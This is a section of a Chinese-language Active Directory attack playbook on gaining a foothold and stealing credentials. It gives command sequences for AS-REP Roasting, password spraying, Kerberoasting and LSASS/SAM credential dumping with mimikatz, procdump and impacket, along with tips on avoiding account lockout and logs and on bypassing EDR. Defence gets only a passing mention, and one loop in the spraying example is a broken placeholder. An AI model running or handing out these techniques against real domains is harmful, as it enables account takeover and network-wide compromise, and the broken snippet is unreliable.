## 3. 初始立足与凭据获取

进入域内后的第一目标是获取**可用的域凭据**——明文密码、NTLM哈希或Kerberos票据。两类无需任何凭据即可发起的攻击：AS-REP Roasting 与密码喷洒。

### 3.1 AS-REP Roasting

针对**未启用预认证(Pre-Authentication)**的账户。Kerberos正常流程中，客户端先用密码生成预认证数据证明身份才换取TGT；若账户关闭预认证(`DONT_REQ_PREAUTH`)，攻击者只需知道用户名即可请求TGT，TGT中含用该用户密码哈希加密的 AS-REP 部分，可离线爆破。

```bash
# 1. 定位未启用预认证的账户(PowerView)
Get-DomainUser -PreauthNotRequired | select samaccountname

# 2. 请求AS-REP并提取可爆破哈希 (impacket GetNPUsers)
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.0.0.1
# 无密码即可请求，输出hashcat可爆破格式

# 3. Rubeus (Windows内)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 4. 离线爆破
hashcat -m 18200 asrep.txt rockyou.txt        # 18200 = Kerberos AS-REP
```

> **要点**：AS-REP Roasting **无需任何凭据**，仅需有效用户名列表。防御：确保所有账户启用预认证。

### 3.2 密码喷洒 (Password Spraying)

用一个常见弱密码(如 `Spring2024!`)对所有用户尝试登录一次，规避账户锁定策略。相比爆破单账户，密码喷洒每账户仅试一次，不触发锁定。

```bash
# impacket rpcdump 检测是否锁定策略
rpcclient -U "" -N 10.0.0.1 -c "getdompwinfo"   # 查看密码策略(lockout threshold)

# 密码喷洒
for user in $(cat users.txt); do
  ntlmrelayx 无关... # 用 kerbrute 更合适
done

# kerbrute (基于Kerberos预认证，不触发常规日志)
kerbrute passwordspray -d corp.local users.txt 'Spring2024!' --dc 10.0.0.1

# spray (SmartHash模式，按策略控制速率)
python3 spray.py -d corp.local -u users.txt -p 'Spring2024!' -s 1
# -s 1 每用户间隔，避免锁定
```

**密码喷洒策略要点**：
- 先查锁定阈值(`lockoutThreshold`)，通常5次，则每账户每天最多试4个密码
- 锁定观察期(`lockoutObservationWindow`)决定何时可再试
- 选季节性密码 `Season+Year+!` 命中率高(如 `Winter2025!`)
- Kerbrute基于Kerberos，产生的4771日志比SMB登录少

### 3.3 Kerberoasting

针对**有SPN的服务账户**。任何域用户都可请求某SPN的TGS票据，TGS用该服务账户的密码哈希加密，可离线爆破。这是**用普通域用户权限换取高权限服务账户密码**的经典攻击。

```bash
# 1. 定位有SPN的账户
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# 2. 请求所有TGS票据 (impacket GetUserSPNs)
GetUserSPNs.py corp.local/user:Pass123! -dc-ip 10.0.0.1 -request
# -request 请求所有TGS，输出hashcat格式

# 3. Rubeus (Windows)
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap

# 4. 离线爆破 (服务账户密码常较长较强，需GPU)
hashcat -m 13100 tgs.txt rockyou.txt        # 13100 = Kerberos TGS (RC4)
hashcat -m 19700 tgs.txt rockyou.txt        # 19700 = Kerberos TGS (AES128)
hashcat -m 19800 tgs.txt rockyou.txt        # 19800 = Kerberos TGS (AES256)
```

**Kerberoasting成功要素**：
- 目标服务账户密码**弱**(常为部署时设的弱密码，运维遗忘修改)
- 优先 RC4-HMAC 加密的TGS(RC4爆破远快于AES)
- 攻击**只需普通域用户**，无需特殊权限，产生的4769日志易被海量正常TGS请求淹没

### 3.4 本地凭据提取

拿到主机管理员权限后，从内存与磁盘提取缓存的凭据：

```bash
# 1. LSASS内存转储 (含明文密码/NTLM哈希/Kerberos票据)
# Mimikatz (经典)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords        # 提取登录密码/哈希
mimikatz # sekurlsa::tickets               # 提取Kerberos票据
mimikatz # lsadump::sam                    # 提取本地SAM哈希
mimikatz # lsadump::dcsync /user:krbtgt    # DCSync拉取(需权限)

# 2. 免杀方式转储LSASS (绕过EDR)
procdump -ma lsass.exe lsass.dmp            # 微软官方procdump，签名
comsvcs.dll MiniDump (通过rundll32)         # 系统自带DLL
nanodump / comsvcs / lsassy                 # 新一代免杀dump工具

# 3. 离线解析dump
pypykatz lsa minidump lsass.dmp             # 纯Python解析mimikatz格式
lsassy -d corp.local -u user -p Pass /10.0.0.5  # 远程dump+解析一条龙

# 4. 其他凭据位置
reg save HKLM\SAM sam.hive                  # SAM数据库(本地账户哈希)
reg save HKLM\SECURITY security.hive        # 缓存的域凭据
reg save HKLM\SYSTEM system.hive            # 解密密钥
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
```

> **要点**：LSASS是凭据金矿。现代EDR重点监控LSASS访问，需用签名工具(procdump)或间接方式(comsvcs)绕过。见 `sinian-omnipotent` 域A免杀技术。

---

